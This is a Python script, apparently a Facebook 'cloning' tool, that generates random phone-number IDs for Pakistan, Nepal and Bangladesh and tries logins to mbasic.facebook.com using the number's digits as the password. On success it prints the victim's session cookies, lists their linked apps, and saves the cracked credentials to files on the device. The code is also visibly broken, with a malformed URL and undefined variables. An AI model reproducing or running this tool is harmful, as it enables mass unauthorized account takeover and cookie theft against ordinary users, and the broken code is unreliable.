

from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
import os,sys,time,json,random,re,string,platform,base64,platform,uuid
import marshal
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures==2 > /dev/null')
    os.system('python U-MAIL.py')
    os.system('pip install bs4')
from bs4 import BeautifulSoup
ugen = []
color=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;35m','\033[1;34m','\033[1;97m'])
A = '\x1b[1;97m'
B = '\x1b[1;96m'
C = '\x1b[1;91m'
D = '\x1b[1;92m'
M = '\033[1;31m'
H = '\033[1;32m'
N = '\x1b[1;37m'
E = '\x1b[1;93m'
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;37m'
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m'
BLUE = '\033[1;32m'
ORANGE = '\033[1;35m'
AHMADO = '{ AHMADO }'
for xd in range(10000):
    a='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['6','7','8','9','10','11','12'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=f'{a} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)

loop = 0
cps = []
oks = []
twf = []
#os.system('xdg-open https://www.facebook.com/profile.php?id=100076836152171/')
os.system('xdg-open https://github.com/SHAKIB-71')

def clear():
    os.system('clear')
    print(poker)
poker = """

\033[1;32m 
\033[1;32m███████╗██╗  ██╗ █████╗ ██╗  ██╗██╗██████╗ 
\033[1;32m██╔════╝██║  ██║██╔══██╗██║ ██╔╝██║██╔══██╗
\033[1;32m███████╗███████║███████║█████╔╝ ██║██████╔╝
\033[1;32m╚════██║██╔══██║██╔══██║██╔═██╗ ██║██╔══██╗
\033[1;32m███████║██║  ██║██║  ██║██║  ██╗██║██████╔╝
\033[1;32m╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═════╝ 
                                           


\033[1;32m ╔══════════════════════════════════════╗
\033[1;32m ║\033[1;32m➠𝐀𝐔𝐓𝐇𝐎𝐑     :MARUF                   \033[1;32m║
\033[1;32m ║\033[1;33m➠𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊   :𝐌d Maruf              \033[1;32m║
\033[1;32m ║\033[1;33m➠𝐆𝐈𝐓𝐇𝐔𝐁     : MARUF-10                 \033[1;32m║
\033[1;32m ║\033[1;32m➠𝐓𝐎𝐎𝐋𝐒      :𝐑𝐀𝐍𝐃𝐎𝐌 𝐁𝐃 𝐂𝐋𝐎𝐍𝐈𝐍𝐆        \033[1;32m║
\033[1;32m ║\033[1;35m➠𝐓𝐎𝐎𝐋 𝐒𝐓𝐀𝐓𝐄 :𝐅𝐑𝐄𝐄                     \033[1;32m║
\033[1;32m ║\033[1;97m➠𝐁𝐄𝐋𝐈𝐄𝐕𝐄 𝐘𝐎𝐔𝐑 𝐒𝐄𝐋𝐅                    \033[1;32m║
\033[1;32m ╚══════════════════════════════════════╝ """




#####     ####




def linex():
    print(f'\033[1;35m༄MARUF•───────────────────────────────────────•༄71᭄')
def checks(oks,cps,twf):
    if not len(oks) != 0:
        pass
    if len(cps) != 0:
        print('\n\n\x1b[1;97m TOTAL OK : \x1b[1;97m %s  \x1b[1;97mSHAKIB-OK.txt' % (
            H, P, str(len(oks))))
        print('\x1b[1;97m TOTAL CP :\x1b[1;97m   %s \x1b[1;97mSHAKIB-CP.txt' %
              (H, P, str(len(cps))))
        print('\x1b[1;97m TOTAL 2F :\x1b[1;97m   %s \x1b[1;97mSHAKIB-2F.txt' %
              (H, P, str(len(twf))))
        input("\x1b[1;97mPRESE ENTER TO BACK xyz  ")
        xyz()
loop = 0
cps = []
oks = []
twf = []
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r %s[%s!%s] %s{ORANGE}SORRY THERE IS NO ACTIVE  APKS %s  '%(ORANGE))
    else:
        print(f'\r {GREEN}[•] %sYOUR ACTIVE APPLICATION DETAILS :'%(GREEN))
        for i in range(len(game)):
            print(f"\r%s[%s] %s %s "%(N,i+1,game[i]. replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r %s[%s!%s] %s{ORANGE}SORRY THERE IS NO EXPIRED APKS %s'%(ORANGE))
    else:
        print(f'\r   %{Green}sYOUR EXPIRED APKS DETAILS :'%(Green))
        for i in range(len(game)):
            print(f"\r%s[%s] %s %s "%(N,i+1,game[i]. replace("Kedaluwarsa"," Kedaluwarsa"),N))
            print(f"{GREEN}[•]---------------------------------------------------[•]")
    #____________#
def Anto():
    os.getuid
    os.system("clear");print(poker)
    print('           \x1b[97m[\033[1;33m     MAIN MENU    \033[0;m] ')
    print(f"")
    print(f"{GREEN}[01]"+color+"RANDOM UID CLONING")
    print(f"{GREEN}[00]"+color+"EXIT PROGRAM ")
    print(f"")
    AHMADO = input("[•] CHOOSE : ")
    if AHMADO in ["1","01"]:
        Tabii()
    elif AHMADO in ["0","00"]:
       exit()
    else:
        print('\033[1;31mINCORECT OPTION!\033[1;31m')
        Anto()

#==========================================================#

#========================================================== #

def Tabii():
    user=[]
    os.getuid
    os.geteuid
    os.system("clear")
    os.system(" xdg-open https://www.facebook.com/profile.php?id=100076836152171")
    print(poker)
    print(f"")
    clear()
    print(f"")
    linex()
    print(f"          \x1b[97m[\033[37;41m  C O D E    M E N U   \033[0;m]")
    print(f"")
    print('  PAK CODE - 92306  92300  92315  92318  92345  ')
    print(f"SHAKIB───────────────────────────────────────•༄71᭄")
    print(f" NEPAL CODE -  97797  97795  97781  97787")
    print(f"SHAKIB───────────────────────────────────────•༄71᭄")
    print(f" BD CODE -  0197   0175  0189  0150  0143   0139   ")
    print(f"SHAKIB───────────────────────────────────────•༄71᭄")
    print(f"")
    linex()
    code = input(' CHOOSE A CODE : ')
    os.system("clear")
    print(poker)
    print(f"")
    print(f"          \x1b[97m[\033[1;32m  L I M I T   M E N U   \033[0;m]")
    print(f"")
    limit = int(input(' EXAMPLE: 1000  2000  5000   10000   99999\n\n PUT CLONING LIMIT: '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        clear()
        tl = str(len(user))
        print(f" {WHITE}TOTAL IDZ             : {BLUE}"+tl)
        print(f" {WHITE}TOOL STATE            : {BLUE}FREE")
        print(f" {WHITE}NUMBER YOU PUT        : {BLUE}"+code)
        print(f" {WHITE}PROCESS HAS BEEN STARTED")
#        print(f" {WHITE}BE PATIENT.......")
        print(f'{YELLOW}───────────────────────────────────────')
        for love in user:
            uid = code+love
            pwx = [love]
            yaari.submit(free,uid,pwx,tl)
def free(uid,pwx,tl):
    global loop
    global oks
    global agents
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'mbasic.facebook.com',
            'method': 'GET',
            'schem': 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
           # 'cookie': 'datr=WcRTZFgZ_z1A0Jt3e1d9R_WC; sb=WcRTZBpGNDLRlQvk0EP_vN2c; vpd=v1%3B1021x512x1.40625; dpr=1.40625; wl_cbv=v2%3Bclient_version%3A2244%3Btimestamp%3A1683615068; locale=en_US; wd=512x1021; fr=0d3AcLuhXRnD4ovQD.AWWomZ8K9Mj6v1xTEnBE5B3SWFU.BkU8RZ.zO.AAA.0.0.BkZeLh.AWXYZw3l9gM',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
            'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-platform-version': '"11.0.0"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': pro }
            lo = session.post('hhttps://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('\r\033[1;32m══════════════════════════════════════════')
                print('\r\033[1;32m[✓] STATUS   :SHAKIB_OK💉')
                print('\r\033[1;32m[✓] NUMBER    : '+uid+'  ')
                print('\r\033[1;32m[✓]PASSWORD     : '+ps+' ')
                print('\r\033[1;32m══════════════════════════════════════════')
                print('\r\033[1;32m[✓] USER COOKIES: '+coki+' ')
                print('\r\033[1;32m══════════════════════════════════════════')
                cek_apk(session,coki)
                open('/sdcard/SHAKIB-OK.txt', 'a').write(cid+' | '+ps+'\n')
                oks.append(idf + '|' + pw)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid=coki[24:39]
                Green = '\033[1;32m'
                print('\r\033[1;32m══════════════════════════════════════════')
                print('\r\033[1;32m[✓] STATUS : SHAKIB_OK💉')
                print('\r\033[1;32m[✓] NUMBER    : ' +uid+ ' ')
                print('\r\033[1;91m[✓]PASSWORD     :' +ps+ ' ')
                print('\r\033[1;32m══════════════════════════════════════════')
                open('/sdcard/SHAKIB-CP.txt', 'a').write(cid+' | '+ps+'\n')
                cps.append(idf + '|' + pw)
                break
            elif '/x/checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid=coki[7:22]
                Green= '\033[1;32m'
                print(f'\r{YELLOW}[TP-LOCK] '+cid+' | '+ps+'\033[1;97m')
                open('/sdcard/2F-😩.txt', 'a').write(cid+' | '+ps+'\n')
                twf.append(cid)
            else:
                continue
        loop+=1
        sys.stdout.write('\r%s ☬ %s/%s ☬ OK:%s ☬ CP:%s ☬ %s%s%s ☬' % (bi, loop, len(id2), ok, cp, int(pers), str(fff), x))
        sys.stdout.flush()
        checks(oks,cps,twf)
    except:
        pass



if __name__ == '__main__':
    Anto()
